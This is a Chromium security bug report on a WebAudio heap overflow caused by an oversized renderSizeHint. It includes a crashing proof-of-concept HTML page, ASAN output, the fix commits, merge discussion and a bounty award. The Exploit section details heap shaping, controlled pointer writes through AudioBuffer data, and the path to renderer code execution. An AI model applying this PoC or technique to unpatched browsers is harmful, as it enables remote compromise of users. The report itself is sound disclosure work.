# Heap Buffer Overflow in RealtimeAnalyser::WriteInput via Configurable Render Quantum Leads to Renderer Remote Code Execution

| Field | Value |
|-------|-------|
| **Issue ID** | [485292589](https://issues.chromium.org/issues/485292589) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>WebAudio |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | mj...@chromium.org |
| **Created** | 2026-02-18 |
| **Bounty** | $11,000.00 |

## Description

## Summary

The `RealtimeAnalyser` class in Chromium's WebAudio implementation maintains a fixed-size ring buffer (`input_buffer_`) of 65536 floats, but the `WriteInput` method copies audio data whose size is determined by the render quantum, which can be set to an arbitrarily large value via the `renderSizeHint` option when the `WebAudioConfigurableRenderQuantum` Origin Trial feature is active. Because the only bounds check is a `DCHECK` assertion that is compiled out in release builds, a single render quantum exceeding 65536 frames causes a heap buffer overflow via `memcpy`. This is a renderer-process memory corruption primitive reachable from any web page that registers for the Origin Trial, enabling remote code execution within the renderer sandbox.

## Root Cause

The `RealtimeAnalyser` constructor allocates its `input_buffer_` with a fixed size defined by `kInputBufferSize`, which equals `kMaxFFTSize * 2 = 32768 * 2 = 65536` floats (262144 bytes). This size is a compile-time constant and is never adjusted based on the render quantum size:

```
// third_party/blink/renderer/modules/webaudio/realtime_analyser.cc
constexpr unsigned kInputBufferSize = RealtimeAnalyser::kMaxFFTSize * 2;

RealtimeAnalyser::RealtimeAnalyser(unsigned render_quantum_frames)
    : input_buffer_(kInputBufferSize),
      down_mix_bus_(AudioBus::Create(1, render_quantum_frames)),
      fft_size_(kDefaultFFTSize),
      magnitude_buffer_(kDefaultFFTSize / 2) {
  analysis_frame_ = std::make_unique<FFTFrame>(kDefaultFFTSize);
}

```

The `WriteInput` method, called from the audio rendering thread on every render quantum, copies `frames_to_process` floats into `input_buffer_` starting at `write_index`. The only protection against an out-of-bounds write is a `DCHECK_LE` assertion, which is stripped from release (non-debug) builds:

```
// third_party/blink/renderer/modules/webaudio/realtime_analyser.cc
void RealtimeAnalyser::WriteInput(AudioBus* bus, uint32_t frames_to_process) {
  unsigned write_index = GetWriteIndex();
  DCHECK_LT(write_index, input_buffer_.size());
  DCHECK_LE(write_index + frames_to_process, input_buffer_.size());

  float* dest = UNSAFE_TODO(input_buffer_.Data() + write_index);

  down_mix_bus_->Zero();
  down_mix_bus_->SumFrom(*bus);
  UNSAFE_TODO(memcpy(dest, down_mix_bus_->Channel(0)->Data(),
                     frames_to_process * sizeof(*dest)));

  write_index += frames_to_process;
  if (write_index >= kInputBufferSize) {
    write_index = 0;
  }
  SetWriteIndex(write_index);
}

```

The caller, `AnalyserHandler::Process`, passes `frames_to_process` directly without any clamping:

```
// third_party/blink/renderer/modules/webaudio/analyser_handler.cc
void AnalyserHandler::Process(uint32_t frames_to_process) {
  scoped_refptr<AudioBus> input_bus = Input(0).Bus();
  analyser_.WriteInput(input_bus.get(), frames_to_process);
  // ...
}

```

The `frames_to_process` value ultimately comes from the render quantum size, which is configurable through the `renderSizeHint` option in `OfflineAudioContextOptions` (or `AudioContextOptions`). When the `WebAudioConfigurableRenderQuantum` runtime feature is enabled, the user-supplied `renderSizeHint` value is used as the render quantum size after passing through `IsValidRenderQuantumSize`, which only checks that the value is between 1 and `6 * sampleRate`:

```
// third_party/blink/renderer/platform/audio/audio_utilities.cc
bool IsValidRenderQuantumSize(uint32_t render_quantum_size, float sample_rate) {
  return render_quantum_size >= MinRenderQuantumSize() &&
         render_quantum_size <= MaxRenderQuantumSize(sample_rate);
}

uint32_t MinRenderQuantumSize() { return 1; }

uint32_t MaxRenderQuantumSize(float sample_rate) {
  return static_cast<uint32_t>(6 * sample_rate);
}

```

For a typical `sampleRate` of 48000, the maximum allowed render quantum size is 288000, which far exceeds the `input_buffer_` capacity of 65536. Even at the minimum supported sample rate of 3000, the maximum render quantum is 18000, still large enough to trigger a significant overflow when combined with a non-zero `write_index`.

The critical insight regarding attack surface is that `WebAudioConfigurableRenderQuantum` is registered as an Origin Trial in Chromium's runtime enabled features configuration:

```
// third_party/blink/renderer/platform/runtime_enabled_features.json5
{
  name: "WebAudioConfigurableRenderQuantum",
  origin_trial_feature_name: "WebAudioConfigurableRenderQuantum",
  status: "experimental",
}

```

This means an attacker does not need Chrome flags or command-line switches to enable this feature. They can register their domain for the Origin Trial, embed the trial token in a `<meta>` tag, and any stable Chrome user visiting the page will have the feature activated.

The `AudioArray` allocator adds a small alignment padding (up to 32 bytes on x86) beyond the requested buffer size, but an attacker-controlled `renderSizeHint` of 65600 already writes 256 bytes past the allocation, and much larger values can corrupt significantly more heap memory. The overflowing data consists of audio sample values (floats), which the attacker partially controls through the structure of the audio graph feeding the `AnalyserNode`.

## Exploit

The overflow produced by `RealtimeAnalyser::WriteInput` is a linear forward `memcpy` that begins at the end of the `input_buffer_` backing store and extends into whatever heap memory follows. The attacker independently controls both the length and the content of this overflow. The overflow length is determined by `renderSizeHint`, which can range from 65537 (the minimum needed to exceed the 65536-float buffer) up to `6 * sampleRate`. At the maximum supported sample rate of 768000 Hz this yields a render quantum of 4608000 frames and a `memcpy` of approximately 18 MB. Even at a conservative 48000 Hz, `renderSizeHint` can reach 288000, producing a 1.15 MB write that overflows by roughly 870 KB. The overflow content consists of single-precision IEEE 754 floats drawn from the audio signal feeding the `AnalyserNode`, which can encode arbitrary 32-bit patterns as described below. The overflow fires on the offline audio rendering thread, a dedicated thread spawned by `OfflineAudioContext.startRendering()`. The `OfflineAudioContext` variant is preferable for exploitation because the attacker controls exactly when rendering starts, and the `suspend()`/`resume()` mechanism allows interleaving JavaScript heap manipulation between render quanta.

The `input_buffer_` backing store is allocated through `Partitions::FastZeroedMalloc`, which routes to PartitionAlloc's `fast_malloc` partition:

```
// third_party/blink/renderer/platform/wtf/allocator/partitions.cc
void* Partitions::FastZeroedMalloc(size_t n, const char* type_name) {
  auto* fast_malloc_partition = FastMallocPartition();
  if (fast_malloc_partition) [[unlikely]] {
    return fast_malloc_partition
        ->AllocInline<partition_alloc::AllocFlags::kZeroFill>(n, type_name);
  } else {
    return calloc(n, 1);
  }
}

```

The `AudioArray::Allocate` method requests `65536 * sizeof(float) + 32 = 262176` bytes, where the extra 32 bytes provide SIMD alignment on x86. According to PartitionAlloc's exponential bucket table, 262176 exceeds the 262144-byte bucket (order 18, index 95) and is promoted to the next available bucket at 294912 bytes (order 18, 9/8 sub-bucket). Each `input_buffer_` backing store therefore occupies a 294912-byte slot, leaving 294912 - 262176 = 32736 bytes of intra-slot padding after the allocation. This has a critical implication: the `renderSizeHint = 65600` used in the ASAN demonstration writes only 262400 bytes, overflowing the 262176-byte allocation by 224 bytes. In an ASAN build this is caught immediately, but in a real release build those 224 bytes land within the 32736-byte intra-slot padding and do not corrupt the adjacent slot. To actually cross the slot boundary and corrupt a neighboring object, the attacker must set `renderSizeHint` such that `renderSizeHint * 4` exceeds the full 294912-byte slot size. A value of approximately 73728 or higher achieves this; for example, `renderSizeHint = 75000` produces a 300000-byte `memcpy` that overflows the slot boundary by approximately 5 KB, which is sufficient to corrupt the header and initial data of the adjacent slot.

The overflow data originates from `down_mix_bus_->Channel(0)->Data()`, which holds the downmixed audio signal from whatever source node is connected to the `AnalyserNode`. By connecting an `AudioBufferSourceNode` loaded with a crafted `AudioBuffer`, the attacker gains precise 32-bit-granularity control over every float value written during the overflow. The attacker creates an `AudioBuffer` with the same sample rate and frame count as the render quantum, obtains a `Float32Array` view of its channel data, then uses a `DataView` on the same underlying `ArrayBuffer` to write arbitrary 32-bit integer patterns that will be reinterpreted as IEEE 754 floats:

```
const buf = ctx.createBuffer(1, renderSizeHint, sampleRate);
const channelData = buf.getChannelData(0);
const dv = new DataView(channelData.buffer);

// Write an arbitrary 64-bit pointer at the overflow region
// (float index 65536 is where the overflow begins)
dv.setUint32((65536 + 0) * 4, ptrLow,  true);
dv.setUint32((65536 + 1) * 4, ptrHigh, true);

```

The audio path from `AudioBufferSourceNode` through `AnalyserNode` performs a direct single-channel copy via `SumFrom` without clamping or saturation, so every 32-bit pattern set by the attacker is preserved exactly through the `memcpy`. This transforms the overflow from a blunt data corruption into a fully controlled write primitive capable of encoding arbitrary pointer values, fake object layouts, or any other structured data required for exploitation.

All WebAudio internal buffers allocated through `AudioFloatArray` use the same `Partitions::FastZeroedMalloc` path, so they land in the same PartitionAlloc partition. The attacker can shape the heap within this partition by creating and destroying WebAudio objects before triggering the overflow. For the target 294912-byte bucket, useful shaping objects include additional `AnalyserNode` instances (whose `input_buffer_` backing stores are always 262176 bytes, landing in the same bucket) and `DelayNode` instances configured with `maxDelayTime` values that produce delay-line buffer allocations in the same size class. The shaping procedure follows a standard defragment-and-backfill pattern: first spray many same-bucket allocations to fill existing slot spans and force the allocator to commit new ones with deterministic sequential layout, then free specific allocations to create holes, and finally create the vulnerable `AnalyserNode` so its `input_buffer_` fills a hole adjacent to a target object in a predictable position. The `OfflineAudioContext.suspend()`/`resume()` mechanism further assists by allowing the attacker to execute arbitrary JavaScript between render quanta for fine-grained heap manipulation during the rendering phase.

Because PartitionAlloc stores its freelist and metadata separately from slot data (in the super page metadata area), the overflow cannot directly corrupt allocator internals. The attacker instead targets application-level objects occupying adjacent slots in the same bucket. The `AudioFloatArray` struct itself (containing `allocation_`, `aligned_data_`, and `size_` fields) is embedded in its parent object rather than in the backing-store slot, so overflowing into a raw float-data slot does not directly corrupt metadata pointers. However, larger composite objects allocated via `USING_FAST_MALLOC` that contain embedded `raw_ptr` or `std::unique_ptr` fields within the same slot become viable targets. Corrupting a `raw_ptr<float>` field such as `AudioChannel::raw_pointer_` to point to an attacker-controlled address converts subsequent audio processing operations on that channel into arbitrary memory reads or writes:

```
// third_party/blink/renderer/platform/audio/audio_channel.h
class AudioChannel final {
 private:
  uint32_t length_;
  raw_ptr<float, DanglingUntriaged> raw_pointer_;
  std::unique_ptr<AudioFloatArray> mem_buffer_;
  bool silent_;
};

```

If the attacker corrupts `raw_pointer_` to point elsewhere and then triggers a read through that `AudioChannel` (for instance via `getFloatTimeDomainData` or audio graph processing that copies from the channel), the corrupted pointer is dereferenced to read or write at the attacker-chosen address. Similarly, corrupting `mem_buffer_` to point to a fake `AudioFloatArray` object in attacker-controlled memory gives the attacker control over both the data pointer and the length of subsequent buffer operations, yielding an unbounded read/write primitive.

With an arbitrary read/write primitive established through a corrupted audio channel pointer, the attacker proceeds through standard renderer exploitation techniques. First, the read primitive is used to leak renderer-process addresses and defeat ASLR by scanning for known object layouts or vtable pointers. Then the write primitive overwrites a function pointer, a vtable entry, or V8 JIT-compiled code to hijack control flow. The attacker can pivot to a ROP/JOP chain or simply overwrite JIT code pages to achieve arbitrary code execution within the renderer sandbox. The overflow is deterministic with no race condition required, repeatable across successive render quanta, and offers attacker control over both the length and byte-level content of the out-of-bounds write. Combined with the WebAudio API's rich set of heap manipulation primitives for shaping the `fast_malloc` partition and the `OfflineAudioContext` suspend/resume mechanism for interleaving JavaScript execution, this vulnerability provides all the building blocks needed for reliable renderer-process code execution on stable Chrome via Origin Trial activation.

## Reproduce

The following HTML file triggers the heap buffer overflow by creating an `OfflineAudioContext` with `renderSizeHint` set to 65600, which exceeds the `input_buffer_` capacity of 65536. An `OscillatorNode` is connected through an `AnalyserNode` to the destination, ensuring audio data flows through `RealtimeAnalyser::WriteInput` during rendering. On the very first render quantum, the `memcpy` writes 65600 floats (262400 bytes) into a buffer that can only hold 65536 floats (262144 bytes), overflowing by 256 bytes.

Save the following as `poc_webaudio_analyser_oob_write.html` and run with:

```
ASAN_OPTIONS=detect_odr_violation=0 /path/to/chrome --headless --no-sandbox --disable-gpu --enable-blink-features=WebAudioConfigurableRenderQuantum "file:///path/to/poc_webaudio_analyser_oob_write.html"

```

Note: the `--enable-blink-features` flag simulates the effect of a valid Origin Trial token for local reproduction. In a real attack scenario, the attacker would embed an Origin Trial token instead.

```
<!DOCTYPE html>
<html>
<body>
<script>
async function trigger() {
  try {
    const sampleRate = 48000;
    // renderSizeHint = 65600 > kInputBufferSize(65536), first quantum overflows
    const ctx = new OfflineAudioContext({
      numberOfChannels: 1,
      length: 65600,
      sampleRate: sampleRate,
      renderSizeHint: 65600
    });

    const osc = new OscillatorNode(ctx, { frequency: 440 });
    const analyser = new AnalyserNode(ctx);

    osc.connect(analyser);
    analyser.connect(ctx.destination);
    osc.start();

    console.log("[*] renderSizeHint = 65600, kInputBufferSize = 65536");
    console.log("[*] Expected OOB write: 65600 - 65536 = 64 floats (256 bytes)");
    console.log("[*] Starting offline rendering...");

    await ctx.startRendering();

    console.log("[!] Rendering completed (should have crashed before this on ASAN)");
  } catch (e) {
    console.log("[!] Exception: " + e.name + ": " + e.message);
  }
}

trigger().then(() => {
  if (typeof window.__done !== 'undefined') window.__done();
});
</script>
</body>
</html>

```

ASAN output from execution confirms the heap buffer overflow:

```
==3750776==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b4012f37820 at pc 0x55942cbe28de bp 0x7b4012dd6db0 sp 0x7b4012dd6570
WRITE of size 262400 at 0x7b4012f37820 thread T9 (OfflineAudioRen)
    #0 0x55942cbe28dd in __asan_memcpy
    #1 0x7f44e3154e52 in blink::RealtimeAnalyser::WriteInput(blink::AudioBus*, unsigned int) third_party/blink/renderer/modules/webaudio/realtime_analyser.cc:246:15
    #2 0x7f44e2fe9fdc in blink::AnalyserHandler::Process(unsigned int) third_party/blink/renderer/modules/webaudio/analyser_handler.cc:60:13
    #3 0x7f44e3037a4d in blink::AudioHandler::ProcessIfNecessary(unsigned int) third_party/blink/renderer/modules/webaudio/audio_handler.cc:331:7
    #4 0x7f44e3059915 in blink::AudioNodeOutput::Pull(blink::AudioBus*, unsigned int) third_party/blink/renderer/modules/webaudio/audio_node_output.cc:135:13
    #5 0x7f44e3056aab in blink::AudioNodeInput::SumAllConnections(scoped_refptr<blink::AudioBus>, unsigned int) third_party/blink/renderer/modules/webaudio/audio_node_input.cc:132:40
    #6 0x7f44e3056f35 in blink::AudioNodeInput::Pull(blink::AudioBus*, unsigned int) third_party/blink/renderer/modules/webaudio/audio_node_input.cc:162:3
    #7 0x7f44e313615b in blink::OfflineAudioDestinationHandler::RenderIfNotSuspended(...) third_party/blink/renderer/modules/webaudio/offline_audio_destination_handler.cc:304:16
    #8 0x7f44e3134c51 in blink::OfflineAudioDestinationHandler::DoOfflineRendering() third_party/blink/renderer/modules/webaudio/offline_audio_destination_handler.cc:188:9

0x7b4012f37820 is located 0 bytes after 262176-byte region [0x7b4012ef7800,0x7b4012f37820)

SUMMARY: AddressSanitizer: heap-buffer-overflow in __asan_memcpy

```

The ASAN report confirms that the `memcpy` in `RealtimeAnalyser::WriteInput` writes 262400 bytes (65600 floats) starting at the exact end of a 262176-byte allocation (262144 bytes for 65536 floats plus 32 bytes of alignment padding), overflowing into adjacent heap memory. The slight difference between 262144 and 262176 is due to the SIMD alignment padding allocated by `AudioArray::Allocate`.

## Timeline

### je...@gmail.com (2026-02-18)

## Bisect

The vulnerability was introduced on 2025-08-04 in commit `8604fa1cfc3c8b285d0330e5c07b6600dab23d37` ("Add IDL for configurable render quantum"), which added the `renderSizeHint` attribute to `AudioContextOptions` and `OfflineAudioContextOptions` along with the `WebAudioConfigurableRenderQuantum` runtime feature flag. This commit enabled JavaScript to set an arbitrary render quantum size, but did not update `RealtimeAnalyser::WriteInput` to validate that `frames_to_process` does not exceed `kInputBufferSize`. The feature was subsequently promoted to Origin Trial readiness on 2026-01-20 in commit `ce2d3306ec10999f9354e6a000bfbae3f8244a5d` ("Prepare configurable render quantum for Origin Trial"), which registered the `origin_trial_feature_name` and made the vulnerability reachable from stable Chrome without command-line flags. The parent commit `4b2c737204de30953e6f3e4beb8dff22486b4fca` immediately before the introduction does not contain the `renderSizeHint` IDL attribute and is not vulnerable.

## Credit

Please use c6eed09fc8b174b0f3eebedcceb1e792 as the credit for this vulnerability. Thank you.

### mj...@chromium.org (2026-02-18)

Thank you for the report. Please note that this Origin Trial is currently closed to new registrations.

### je...@gmail.com (2026-02-19)

re #c3: The published OT will not be revoked, so this does not affect the fact that this vulnerability impacts the stable version. Moreover, this feature is expected to be released soon.

### ch...@google.com (2026-02-19)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-19)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### mj...@chromium.org (2026-02-20)

The most straightforward fix would be to make the buffer larger (2\*render\_quantum\_size), but this could be very large and consume a lot of memory. I am still considering alternatives.

### mj...@chromium.org (2026-03-05)

<https://crrev.com/c/7635720> should mitigate this by using checked array bounds, once it lands. The repro case will still crash but should no longer be exploitable.

[#comment4](https://issues.chromium.org/issues/485292589#comment4) I was not trying to downplay the severity of this issue. Thank you for the report. I am in charge of the release of the feature, and we will not release it until the security problems are resolved. I was only adding that comment so that the security team knows we don't have to monitor for new OT registrants.

### dx...@google.com (2026-03-06)

Project: chromium/src  

Branch:  main  

Author:  Michael Wilson [mjwilson@chromium.org](mailto:mjwilson@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7635720>

Replace UNSAFE\_TODO in RealtimeAnalyser with safe operations

---


Expand for full commit details
```
     
    We can use span methods instead of memcpy. 
     
    This should cause no functional change. 
     
    Bug: 401184803 
    Bug: 485292589 
    Change-Id: Ia9d37cfb56827560cadddb4d02d94cce14c78a85 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7635720 
    Reviewed-by: Hongchan Choi <hongchan@chromium.org> 
    Commit-Queue: Michael Wilson <mjwilson@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1595131}

```

---

Files:

- M `third_party/blink/renderer/modules/webaudio/realtime_analyser.cc`

---

Hash: [ddadc8e05544649e4f0c3273d7366a4492db7331](https://chromiumdash.appspot.com/commit/ddadc8e05544649e4f0c3273d7366a4492db7331)  

Date: Fri Mar 6 03:37:11 2026


---

### mj...@chromium.org (2026-03-06)

Fix landed in 147.0.7722.0 -- submitter are you able to help verify?

### je...@gmail.com (2026-03-07)

re #c10: I verified the patch (<https://crrev.com/c/7635720>) on a local ASAN build.

Before the patch, the PoC triggers a heap-buffer-overflow as expected:

```
  ==23849==ERROR: AddressSanitizer: heap-buffer-overflow
  WRITE of size 262400 at 0x000173cb8810 thread T12
  #1 blink::RealtimeAnalyser::WriteInput

```

After applying the patch, the memcpy is replaced by span::subspan().copy\_from(), and the CHECK in base::span::subspan() fires before any data is copied:

```
  FATAL:base/containers/span.h:1262
  Check failed: size_type{offset} <= size() && size_type{count} <= size() - size_type{offset}
  #0 blink::RealtimeAnalyser::WriteInput

```

The patch effectively converts the exploitable heap overflow into a controlled crash. No heap memory is corrupted. From an exploitation perspective, this is a sufficient mitigation.

### mj...@chromium.org (2026-03-07)

Thank you for verifying. Setting to fixed.

### ch...@google.com (2026-03-07)

Security Merge Request Consideration: Requesting merge to extended stable (M144) because latest trunk commit (1595131) appears to be after extended stable branch point (1552494).
Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1595131) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1595131) appears to be after beta branch point (1582197).
Security Merge Request - Manual Review: Merge review required: M144 is already shipping to stable.

Security Merge Request - Manual Review: Merge review required: M145 is already shipping to stable.

Security Merge Request - Manual Review: Merge review required: M146 has already been cut for stable release.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [144, 145, 146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### dr...@chromium.org (2026-03-07)

No crashes in Canary, approved to merge to M146. We don't plan more M144 or M145 releases, so removing those merge labels.

### dx...@google.com (2026-03-11)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Michael Wilson [mjwilson@chromium.org](mailto:mjwilson@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7651525>

[M146] Replace UNSAFE\_TODO in RealtimeAnalyser with safe operations

---


Expand for full commit details
```
     
    We can use span methods instead of memcpy. 
     
    This should cause no functional change. 
     
    (cherry picked from commit ddadc8e05544649e4f0c3273d7366a4492db7331) 
     
    Bug: 401184803 
    Bug: 485292589 
    Change-Id: Ia9d37cfb56827560cadddb4d02d94cce14c78a85 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7635720 
    Reviewed-by: Hongchan Choi <hongchan@chromium.org> 
    Commit-Queue: Michael Wilson <mjwilson@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1595131} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7651525 
    Cr-Commit-Position: refs/branch-heads/7680@{#2361} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `third_party/blink/renderer/modules/webaudio/realtime_analyser.cc`
- M `third_party/blink/renderer/platform/audio/audio_channel.h`

---

Hash: [88b18bb1db0ff7e7d3873984c67c02cd5e770543](https://chromiumdash.appspot.com/commit/88b18bb1db0ff7e7d3873984c67c02cd5e770543)  

Date: Wed Mar 11 17:41:50 2026


---

### pe...@google.com (2026-03-11)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### qk...@google.com (2026-03-12)

Labeled `LTS-NotApplicable-138` label because M138 doesn't have the suspected CL[1]

[1] https://chromium-review.git.corp.google.com/c/chromium/src/+/6803188

### sp...@google.com (2026-03-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.

Rationale for this decision:
High-quality report of demonstrated memory corruption in a sandboxed process and a bisect bonus


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### pe...@google.com (2026-04-09)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-04-09)

1. https://chromium-review.git.corp.google.com/c/chromium/src/+/7741941
2. Low - There was no conflict.
3. 146
4. Yes, the bug exists in M144.

### mj...@chromium.org (2026-04-09)

[#comment20](https://issues.chromium.org/issues/485292589#comment20) Just to note: the origin trial was enabled from M145 onward so this would not be reachable in M144 unless Chromium was launched with a command-line flag enabling the feature. I agree there's low risk merging the fix to 144 if desired.

### qk...@google.com (2026-04-10)

mjwilson@, thank you for the info. If so, it would be safer to abandon to cherry-pick the CL to M144 LTS. I labeled this bug to LTS-NotApplicable-144.

### ch...@google.com (2026-06-14)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485292589)*
